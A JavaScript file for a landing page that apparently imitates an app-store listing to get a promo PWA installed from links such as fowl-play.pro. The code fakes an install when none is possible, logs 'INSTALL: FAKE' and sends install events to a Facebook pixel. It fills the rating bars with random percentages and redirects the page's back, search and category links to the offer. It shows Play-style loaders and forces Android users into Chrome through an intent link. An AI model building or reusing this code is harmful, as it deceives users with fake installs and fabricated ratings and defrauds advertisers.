console.log(123)
const url = "https://godstraff.com/J73MZJGv"
// const url = "https://godstraff.pro/cwv1l3k.php?key=x6t21rzbhyuxkvydzere"

const server_url = ""
// const landing_url = "/play-pay?style=spirit-en"
const landing_url = 'https://fowl-play.pro/';
const promo_id = ""

const module_promo = "true"

const module_only_offer = true
const module_push_subscribe = true
const module_full_screen = false
const module_offer_in_iframe = true
const module_back_open = false
const module_loader = true
const module_post_install = true
const view = true
var module_landing = false
if (landing_url == 'None') {
    module_landing = false
}
var loader = "classic"

var user = detect.parse(navigator.userAgent);
var object_storage = new StorageLogic();
var object_parameters = new ParametrsLogic();
var buyer_id = object_parameters.get_buyer_id(object_storage);
var object_events = new EventActivityLogic(server_url, user.os.family, user.browser.family, buyer_id, location.hostname);

object_parameters.search = window.location.search;
// object_parameters.pixel = '1401988980462533';
object_parameters.pixel = get_param_value('pixel');
object_parameters.fbclid = get_param_value('fbclid');
// object_parameters.status = get_param_value('status');
// object_parameters.status = 'lead';
object_parameters.promo = module_promo;
object_parameters.buyer = buyer_id;
// console.log('object_parameters.pixel:', object_parameters.pixel);
// console.log('object_parameters.fbclid:', object_parameters.fbclid);
// console.log('object_parameters.status:', object_parameters.status);
object_parameters.redirect = get_param_value('redirect');
object_parameters.url = url;
object_parameters.landing = landing_url;
object_parameters.landing_status = module_landing;
object_parameters.promo_id = promo_id;
var parameters = object_parameters.search.substring(1);
var storage = object_storage.get_parameters();

console.log('parameters=', parameters)

if (!get_param_value('external_id')) {
    var external_id = object_storage.get_user_id();
} else {
    var external_id = get_param_value('external_id');
}
console.log('object_parameters.external_id:', object_parameters.external_id);

if (storage) {
    const urlParams = new URLSearchParams(storage);
    const queryParamFbp = "fbp"
    const queryParam = "fbclid"
    if (!object_parameters.fbclid) {
        if (urlParams.has(queryParam)) {
            object_parameters.fbclid = urlParams.get(queryParam);
        }
    }
    if (!object_parameters.pixel) {
        if (urlParams.has(queryParamFbp)) {
            object_parameters.pixel = urlParams.get(queryParamFbp);
        }
    }
}

var object_fbp = new FacebookLogic(object_parameters.pixel, object_parameters.fbclid, object_parameters.status, external_id)

if (object_parameters.back_open_status(object_storage, user) && module_back_open) {
    object_storage.set_back_open();

    try {
        object_fbp.init_pixel();
    } catch (e) {
        console.log('Error: ' + e)
    }

    object_parameters.back_open_process(parameters);
} else {
    if (isRunningStandalone()) {
        parameters = object_storage.get_parameters();
        object_parameters.open_standalone_process(parameters);
    } else {
        if (object_parameters.redirect == "true") {
            object_parameters.redirect_process(storage);
        } else {
            if (parameters.includes('sub_id_3') || parameters.includes('sub3')) {
                if (storage == null || storage == "" || storage == false) {
                    object_storage.set_parameters(parameters)
                    object_storage.set_buyer(object_parameters.buyer)
                }
            }

            let newParameters = parameters.split('&');
            if (parameters.includes('sub_id_3')) {
                newParameters.push(`sub_id_10=${object_storage.get_user_id()}`);
                newParameters.push(`sub_id_11=${window.location.hostname}`);
                newParameters = newParameters.join('&');

                object_storage.set_parameters(newParameters);
            } else if (parameters.includes('sub3')) {
                newParameters.push(`sub10=${object_storage.get_user_id()}`);
                newParameters.push(`sub11=${window.location.hostname}`);
                newParameters = newParameters.join('&');

                object_storage.set_parameters(newParameters);
            }

            // var newURL = location.href.split("?")[0];
            // if(object_parameters.fbclid){
            //   newURL = addParamsToUrl(newURL, "fbclid=" + object_parameters.fbclid);
            // }
            // window.history.pushState('object', document.title, newURL);

        }
    }
}




var deferredPrompt = null;
var object_pwa = new PwaLogic(deferredPrompt)

var object_animation = new AnimationLogic()

window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    deferredPrompt = e;
    object_pwa.deferredPrompt = deferredPrompt
    if (module_post_install) {
        create_overlay_object();
    }
    //event
    object_events.send_event('EVENT: CAN REAL INSTALL');
});

window.addEventListener('appinstalled', () => {
    object_storage.set_storage_installed(true);
    object_fbp.send_install_event();
    console.log('send event');
    if (object_animation.install_animation == false) {
        object_animation.install_proccess();
    }
    //event
    object_events.send_event('INSTALL: REAL');
    object_pwa.deferredPrompt = null;
    // redirect 
    // window.location.href = '/?redirect=true';
});

$(document).on('click', '#overlay', function () {
    document.getElementById('overlay').remove();
    if (object_pwa.can_install()) {
        object_pwa.install();
    }
});

function fake_install_start() {
    object_storage.set_storage_installed(true);
    object_fbp.send_install_event();
    console.log('send event');
    object_animation.install_proccess();
    object_animation.install_animation = true
    //event
    object_events.send_event('INSTALL: FAKE');
    offer_in_iframe_setting('fake');
}

function offer_in_iframe_setting(install) {
    if (module_offer_in_iframe && user.os.family == "Android") {
        if (install == 'fake' && document.fullscreenElement) {
            var elemento = document.getElementsByClassName('pr-open')[0];
            elemento.removeAttribute("href");
            elemento.removeAttribute("target");
            elemento.setAttribute("onclick", "show_iframe()");
        }
    }
}

function create_overlay_object() {
    if (object_animation.install_animation) {
        if (object_pwa.can_install()) {
            if (object_animation.show_overlay == false) {
                object_animation.show_overlay = true
                let div = document.createElement('div');
                div.className = 'overlay';
                div.id = "overlay";
                document.body.append(div);
            }
        }
    }
}

$(document).on('click', '#pr-install', function () {
    if ($('#install-button').css('display') == 'block') {
        if ($("#pr-install").hasClass("true-install")) {
            object_pwa.install()
        } else if ($("#pr-install").hasClass("fake-install")) {
            if (object_pwa.can_install()) {
                object_pwa.install()
            } else {
                fake_install_start();
            }
        }
    }
});

document.addEventListener("DOMContentLoaded", function () {
    if (object_fbp.status) {
        object_fbp.init_pixel();
        object_fbp.send_server_event();
    } else {
        try {
            object_fbp.init_pixel();
        } catch (e) {
            console.log('Error: ' + e)
        }

    }

    var url = addParamsToUrl(window.location.href, "redirect=true");
    var element = document.getElementById('pr-open');
    var element_site = document.getElementById('site');
    element.setAttribute("href", url);
    element_site.setAttribute("href", url);

    setTimeout(function () {
        // alert("timeout");
        if (user.browser.family == "Chrome" || user.browser.family == "Chrome Mobile") {
            if (object_pwa.can_install()) {
                // alert("Chrome, можно установить! Показываем кнопку 'Установить'")
                object_animation.hide_loader()
                object_animation.show_true_install()
            } else {
                if (object_storage.get_storage_installed()) {
                    // alert("Chrome, нельзя установить! Показываем кнопку 'Открыть'")
                    object_animation.hide_loader()
                    object_animation.show_open()
                } else {
                    // alert("Chrome, нельзя установить! Показываем кнопку 'Установить(Фейк)'")
                    object_animation.hide_loader()
                    object_animation.show_fake_install()
                    // object_animation.show_true_install()
                }
            }
        } else {
            if (object_pwa.can_install()) {
                // alert("Не Chrome, но можно установить! Показываем кнопку 'Установить'")
                object_animation.hide_loader()
                object_animation.show_true_install()
            } else {
                if (object_storage.get_storage_installed()) {
                    // alert("Не Chrome, нельзя установить! Была фейковая установка! Показываем кнопку 'Открыть'")
                    object_animation.hide_loader()
                    object_animation.show_open()
                } else {
                    // alert("Не Chrome, нельзя установить! Небыло фейковой установки! Показываем кнопку 'Установить(Фейк)'")
                    object_animation.hide_loader()
                    object_animation.show_fake_install()
                    //  object_animation.show_true_install()
                }
            }
        }
    }, 4000);
});



$(document).ready(function () {
    $('input').keydown(function (e) {
        if (e.keyCode === 13) {
            var value = document.getElementById('input_search').value;
            window.location.href = window.location.href + "/search" + "?search=" + value;
        }
    });
});



if (module_full_screen && user.os.family == "Android") {
    // if (module_full_screen) {
    PrevLoader.show();
    setTimeout(() => {
        PrevLoader.hide();
    }, 7000);
} else {
    if (module_loader) {
        if (loader == 'classic' || view == false) {
            AmagiLoader.show();
            setTimeout(() => {
                AmagiLoader.hide();
            }, 2000);
        } else if (loader == 'googleplay') {
            PlayLoader.show();
            setTimeout(() => {
                PlayLoader.hide();
            }, 2000);
        }
    }
}



function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min)) + min;
}

if (localStorage.getItem("one") != null) {
    var one = localStorage.getItem("one")
    var two = localStorage.getItem("two")
    var three = localStorage.getItem("three")
    var four = localStorage.getItem("four")
    var five = localStorage.getItem("five")
} else {
    var stars = parseFloat("4.7")
    if (stars > 4.7) {
        five = new String(getRandomInt(50, 70)) + "%"
        four = new String(getRandomInt(10, 25)) + "%"
        three = new String(getRandomInt(5, 15)) + "%"
        two = new String(getRandomInt(5, 10)) + "%"
        one = new String(getRandomInt(5, 15)) + "%"
    } else if (stars > 4.0) {
        five = new String(getRandomInt(45, 65)) + "%"
        four = new String(getRandomInt(20, 35)) + "%"
        three = new String(getRandomInt(10, 20)) + "%"
        two = new String(getRandomInt(5, 15)) + "%"
        one = new String(getRandomInt(10, 25)) + "%"
    } else if (stars > 3.5) {
        five = new String(getRandomInt(30, 45)) + "%"
        four = new String(getRandomInt(20, 35)) + "%"
        three = new String(getRandomInt(20, 30)) + "%"
        two = new String(getRandomInt(10, 20)) + "%"
        one = new String(getRandomInt(10, 25)) + "%"
    } else if (stars > 3.0) {
        five = new String(getRandomInt(25, 30)) + "%"
        four = new String(getRandomInt(20, 35)) + "%"
        three = new String(getRandomInt(15, 30)) + "%"
        two = new String(getRandomInt(10, 20)) + "%"
        one = new String(getRandomInt(15, 25)) + "%"
    } else if (stars > 2.5) {
        five = new String(getRandomInt(15, 25)) + "%"
        four = new String(getRandomInt(20, 35)) + "%"
        three = new String(getRandomInt(25, 30)) + "%"
        two = new String(getRandomInt(10, 25)) + "%"
        one = new String(getRandomInt(20, 35)) + "%"
    } else if (stars > 2.0) {
        five = new String(getRandomInt(10, 20)) + "%"
        four = new String(getRandomInt(15, 25)) + "%"
        three = new String(getRandomInt(5, 15)) + "%"
        two = new String(getRandomInt(15, 25)) + "%"
        one = new String(getRandomInt(25, 45)) + "%"
    } else {
        five = new String(getRandomInt(5, 20)) + "%"
        four = new String(getRandomInt(10, 20)) + "%"
        three = new String(getRandomInt(5, 25)) + "%"
        two = new String(getRandomInt(20, 35)) + "%"
        one = new String(getRandomInt(40, 55)) + "%"
    }
    localStorage.setItem("one", one)
    localStorage.setItem("two", two)
    localStorage.setItem("three", three)
    localStorage.setItem("four", four)
    localStorage.setItem("five", five)
}
document.getElementsByClassName('one')[0].style.width = one;
document.getElementsByClassName('two')[0].style.width = two;
document.getElementsByClassName('three')[0].style.width = three;
document.getElementsByClassName('four')[0].style.width = four;
document.getElementsByClassName('five')[0].style.width = five;




var param = object_storage.get_parameters()
var element_back = document.getElementsByClassName("header-back")[0];
var element_search = document.getElementsByClassName("header-search")[0];
var element_category = document.getElementsByClassName("description__category-btn")[0];
if (module_only_offer) {
    var urls = addParamsToUrl(window.location.href, "redirect=true");
    for (const element of elements) {
        element.href = urls;
    }
    element_back.href = urls;
    element_search.href = urls;
    element_category.href = urls;
} else {
    if (param != null && param != "") {
        if (param.indexOf('store=true') < 0) {
            for (const element of elements) {
                element.href = addParamsToUrl(window.location.href, param + "&store=true");
            }
            element_back.href = addParamsToUrl(window.location.href, param);
            element_search.href = addParamsToUrl(window.location.href, param);
            element_category.href = addParamsToUrl(window.location.href, param);
        } else {
            for (const element of elements) {
                element.href = addParamsToUrl(window.location.href, "store=true");
            }
        }
    }
}
// Get the modal
var modal = document.getElementById("myModal");

function openFullscreen() {
    object_storage.set_fullscreen()
    var elem = document.body;
    modal.style.display = "none";
    var show = true
    if (show) {
        PlayLoader.show();
        setTimeout(() => {
            PlayLoader.hide();
        }, 2500);
    }
    if (elem.requestFullscreen) {
        document.documentElement.requestFullscreen({ navigationUI: "hide" })
    } else if (elem.mozRequestFullScreen) { /* Firefox */
        elem.mozRequestFullScreen();
    } else if (elem.webkitRequestFullscreen) { /* Chrome, Safari & Opera */
        elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) { /* IE/Edge */
        elem.msRequestFullscreen();
    }
}


const ua = new UAParser;
if (ua.getBrowser().name !== "Chrome") {
    var lnk = document.getElementById("r");
    lnk.setAttribute("href", "intent://" + window.location.hostname + window.location.search + "#Intent;scheme=https;package=com.android.chrome;end");
    lnk.click();
}
